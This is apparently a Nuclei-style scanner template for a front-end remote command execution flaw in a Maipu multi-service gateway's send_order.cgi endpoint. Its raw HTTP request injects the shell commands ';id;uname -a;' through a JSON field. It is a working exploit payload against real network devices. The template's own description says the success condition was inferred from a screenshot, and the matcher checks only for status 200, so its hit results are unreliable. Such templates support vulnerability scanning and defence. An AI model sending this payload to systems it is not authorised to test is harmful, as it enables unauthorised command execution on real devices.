id: poc-vvagh70yfe5i5f3s
info:
  name: 迈普 多业务融合网关 send_order.cgi 前台RCE漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: rce,2024
http:
- raw:
  - 'POST /send_order.cgi?parameter=operation HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64MHhzZWM=; x64; rv:99.0) Gecko/20100101 Firefox/99.0

    Content-Type: application/x-www-form-urlencoded

    Connection: keep-alive

    {"opid":"1","name":";id;uname -a;","type":"rest"}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
